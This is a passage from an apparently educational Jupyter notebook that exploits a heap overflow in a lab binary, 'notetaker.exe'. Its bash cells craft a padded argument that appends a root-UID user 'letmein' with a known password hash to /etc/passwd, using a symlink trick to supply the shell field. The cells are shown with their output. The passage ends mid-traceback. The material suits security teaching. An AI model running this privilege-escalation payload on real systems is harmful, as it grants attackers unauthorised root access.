      "bash: line 2:  4315 Aborted                 ./notetaker.exe $(perl -e 'print \"A\"x112 . \"testfile\"')\n"
     ]
    },
    {
     "ename": "CalledProcessError",
     "evalue": "Command 'b'# let\\'s create testfile and write the data sent as an argument\\n./notetaker.exe $(perl -e \\'print \"A\"x112 . \"testfile\"\\')\\n'' returned non-zero exit status 134.",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mCalledProcessError\u001b[0m                        Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-85-4df401b52885>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mget_ipython\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrun_cell_magic\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'bash'\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m''\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'# let\\'s create testfile and write the data sent as an argument\\n./notetaker.exe $(perl -e \\'print \"A\"x112 . \"testfile\"\\')\\n'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/interactiveshell.py\u001b[0m in \u001b[0;36mrun_cell_magic\u001b[0;34m(self, magic_name, line, cell)\u001b[0m\n\u001b[1;32m   2321\u001b[0m             \u001b[0mmagic_arg_s\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvar_expand\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstack_depth\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2322\u001b[0m             \u001b[0;32mwith\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbuiltin_trap\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 2323\u001b[0;31m                 \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mfn\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mmagic_arg_s\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   2324\u001b[0m             \u001b[0;32mreturn\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2325\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mnamed_script_magic\u001b[0;34m(line, cell)\u001b[0m\n\u001b[1;32m    140\u001b[0m             \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    141\u001b[0m                 \u001b[0mline\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mscript\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 142\u001b[0;31m             \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mshebang\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    143\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    144\u001b[0m         \u001b[0;31m# write a basic docstring:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m</home/user/miniconda3/lib/python3.7/site-packages/decorator.py:decorator-gen-109>\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magic.py\u001b[0m in \u001b[0;36m<lambda>\u001b[0;34m(f, *a, **k)\u001b[0m\n\u001b[1;32m    185\u001b[0m     \u001b[0;31m# but it's overkill for just that one bit of state.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    186\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mmagic_deco\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 187\u001b[0;31m         \u001b[0mcall\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mlambda\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    188\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    189\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mcallable\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n\u001b[1;32m    243\u001b[0m             \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstderr\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mflush\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    244\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0margs\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mraise_error\u001b[0m \u001b[0;32mand\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m!=\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 245\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0mCalledProcessError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0moutput\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mout\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstderr\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0merr\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    246\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    247\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m_run_script\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mto_close\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mCalledProcessError\u001b[0m: Command 'b'# let\\'s create testfile and write the data sent as an argument\\n./notetaker.exe $(perl -e \\'print \"A\"x112 . \"testfile\"\\')\\n'' returned non-zero exit status 134."
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "# let's create testfile and write the data sent as an argument\n",
    "./notetaker.exe $(perl -e 'print \"A\"x112 . \"testfile\"')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rw------- 1 root root 126 Apr 29 13:25 testfile\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "ls -al testfile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "cat: testfile: Permission denied\n"
     ]
    },
    {
     "ename": "CalledProcessError",
     "evalue": "Command 'b'cat testfile\\n'' returned non-zero exit status 1.",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mCalledProcessError\u001b[0m                        Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-87-f6b2927fcb5a>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mget_ipython\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrun_cell_magic\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'bash'\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m''\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'cat testfile\\n'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/interactiveshell.py\u001b[0m in \u001b[0;36mrun_cell_magic\u001b[0;34m(self, magic_name, line, cell)\u001b[0m\n\u001b[1;32m   2321\u001b[0m             \u001b[0mmagic_arg_s\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvar_expand\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstack_depth\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2322\u001b[0m             \u001b[0;32mwith\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbuiltin_trap\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 2323\u001b[0;31m                 \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mfn\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mmagic_arg_s\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   2324\u001b[0m             \u001b[0;32mreturn\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2325\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mnamed_script_magic\u001b[0;34m(line, cell)\u001b[0m\n\u001b[1;32m    140\u001b[0m             \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    141\u001b[0m                 \u001b[0mline\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mscript\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 142\u001b[0;31m             \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mshebang\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    143\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    144\u001b[0m         \u001b[0;31m# write a basic docstring:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m</home/user/miniconda3/lib/python3.7/site-packages/decorator.py:decorator-gen-109>\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magic.py\u001b[0m in \u001b[0;36m<lambda>\u001b[0;34m(f, *a, **k)\u001b[0m\n\u001b[1;32m    185\u001b[0m     \u001b[0;31m# but it's overkill for just that one bit of state.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    186\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mmagic_deco\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 187\u001b[0;31m         \u001b[0mcall\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mlambda\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    188\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    189\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mcallable\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n\u001b[1;32m    243\u001b[0m             \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstderr\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mflush\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    244\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0margs\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mraise_error\u001b[0m \u001b[0;32mand\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m!=\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 245\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0mCalledProcessError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0moutput\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mout\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstderr\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0merr\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    246\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    247\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m_run_script\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mto_close\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mCalledProcessError\u001b[0m: Command 'b'cat testfile\\n'' returned non-zero exit status 1."
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "cat testfile"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exploit the heap-overflow flaw in notetaker program\n",
    "- several clever ways to exploit this type of capability\n",
    "- append a user to the /etc/passwd file?\n",
    "- make a backup copy of the file just incase..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "cp /etc/passwd /tmp/passwd.bkup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 90,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "root:x:0:0:root:/root:/bin/bash\n",
      "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
      "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n",
      "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n",
      "sync:x:4:65534:sync:/bin:/bin/sync\n",
      "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n",
      "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n",
      "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n",
      "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n",
      "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n",
      "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n",
      "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n",
      "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
      "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n",
      "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n",
      "irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n",
      "gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n",
      "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n",
      "_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n",
      "systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n",
      "systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n",
      "systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n",
      "mysql:x:104:110:MySQL Server,,,:/nonexistent:/bin/false\n",
      "ntp:x:105:111::/nonexistent:/usr/sbin/nologin\n",
      "messagebus:x:106:112::/nonexistent:/usr/sbin/nologin\n",
      "Debian-exim:x:107:114::/var/spool/exim4:/usr/sbin/nologin\n",
      "uuidd:x:108:115::/run/uuidd:/usr/sbin/nologin\n",
      "redsocks:x:109:116::/var/run/redsocks:/usr/sbin/nologin\n",
      "tss:x:110:117:TPM2 software stack,,,:/var/lib/tpm:/bin/false\n",
      "rwhod:x:111:65534::/var/spool/rwho:/usr/sbin/nologin\n",
      "iodine:x:112:65534::/var/run/iodine:/usr/sbin/nologin\n",
      "stunnel4:x:113:120::/var/run/stunnel4:/usr/sbin/nologin\n",
      "miredo:x:114:65534::/var/run/miredo:/usr/sbin/nologin\n",
      "dnsmasq:x:115:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\n",
      "sslh:x:116:122::/nonexistent:/usr/sbin/nologin\n",
      "postgres:x:117:124:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\n",
      "usbmux:x:118:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n",
      "rtkit:x:119:126:RealtimeKit,,,:/proc:/usr/sbin/nologin\n",
      "_rpc:x:120:65534::/run/rpcbind:/usr/sbin/nologin\n",
      "Debian-snmp:x:121:128::/var/lib/snmp:/bin/false\n",
      "statd:x:122:65534::/var/lib/nfs:/usr/sbin/nologin\n",
      "inetsim:x:123:129::/var/lib/inetsim:/usr/sbin/nologin\n",
      "sshd:x:124:65534::/run/sshd:/usr/sbin/nologin\n",
      "pulse:x:125:131:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\n",
      "speech-dispatcher:x:126:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false\n",
      "avahi:x:127:134:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin\n",
      "saned:x:128:135::/var/lib/saned:/usr/sbin/nologin\n",
      "colord:x:129:137:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\n",
      "geoclue:x:130:138::/var/lib/geoclue:/usr/sbin/nologin\n",
      "king-phisher:x:131:139::/var/lib/king-phisher:/usr/sbin/nologin\n",
      "Debian-gdm:x:132:140:Gnome Display Manager:/var/lib/gdm3:/bin/false\n",
      "systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n",
      "user:x:1000:1000:user,12,,:/home/user:/bin/bash\n",
      "tom:x:1001:1001:tom,123,456,:/home/tom:/bin/bash\n",
      "jerry:x:1002:1002:jerry,788,454,:/home/jerry:/bin/bash\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "cat /tmp/passwd.bkup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## /etc/passwd file format\n",
    "\n",
    "username:password:userid:groupid:User Info:home folder:default shell\n",
    "- x : hashed password stored in /etc/shadow file\n",
    "- the password field can contain hashed password\n",
    "- Perl crypt() function uses same function used by system to hash password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 91,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "AA6tQYSfGxd/A"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "perl -e 'print crypt(\"password\", \"AA\")'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 92,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "XXq2wKiyI43A2"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "perl -e 'print crypt(\"password\", \"XX\")'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## goal: genarate a entry that looks like\n",
    "\n",
    "`letmein:XXq2wKiyI43A2:0:0:me:/root:/bin/bash`\n",
    "\n",
    "### problem:\n",
    "- it's hard to generate the exact line ending with /bin/bash\n",
    "    - the file name /etc/passwd will be automatically attached at the end\n",
    "\n",
    "### workaround:\n",
    "- make /etc/passwd a soft link pointing to /bin/bash"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 94,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "mkdir /tmp/etc\n",
    "ln -s /bin/bash /tmp/etc/passwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 95,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "lrwxrwxrwx 1 user user 9 Apr 29 13:38 /tmp/etc/passwd -> /bin/bash\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "ls -l /tmp/etc/passwd"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### now we've a valid password entry that looks like:\n",
    "\n",
    "`letmein:XXq2wKiyI43A2:0:0:me:/root:/tmp/etc/passwd`\n",
    "\n",
    "#### one more thing:\n",
    "- the value just before /etc/passwd must be 112 bytes long, remember?\n",
    "- can play with user information column to adjust the length\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "37\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "# find the length with empty user info\n",
    "echo -ne letmein:XXq2wKiyI43A2:0:0::/root:/tmp | wc -c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "75\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "echo $((112-37))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "112\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "perl -e 'print \"letmein:XXq2wKiyI43A2:0:0:\" . \"A\"x75 . \":/root:/tmp\"' | wc -c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 99,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "munmap_chunk(): invalid pointer\n",
      "bash: line 1:  4615 Aborted                 ./notetaker.exe $(perl -e 'print \"letmein:XXq2wKiyI43A2:0:0:\" . \"A\"x75 . \":/root:/tmp/etc/passwd\"')\n"
     ]
    },
    {
     "ename": "CalledProcessError",
     "evalue": "Command 'b'./notetaker.exe $(perl -e \\'print \"letmein:XXq2wKiyI43A2:0:0:\" . \"A\"x75 . \":/root:/tmp/etc/passwd\"\\')\\n'' returned non-zero exit status 134.",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mCalledProcessError\u001b[0m                        Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-99-14a3b74290b4>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mget_ipython\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrun_cell_magic\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'bash'\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m''\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'./notetaker.exe $(perl -e \\'print \"letmein:XXq2wKiyI43A2:0:0:\" . \"A\"x75 . \":/root:/tmp/etc/passwd\"\\')\\n'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/interactiveshell.py\u001b[0m in \u001b[0;36mrun_cell_magic\u001b[0;34m(self, magic_name, line, cell)\u001b[0m\n\u001b[1;32m   2321\u001b[0m             \u001b[0mmagic_arg_s\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvar_expand\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstack_depth\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2322\u001b[0m             \u001b[0;32mwith\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbuiltin_trap\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 2323\u001b[0;31m                 \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mfn\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mmagic_arg_s\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   2324\u001b[0m             \u001b[0;32mreturn\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2325\u001b[0m 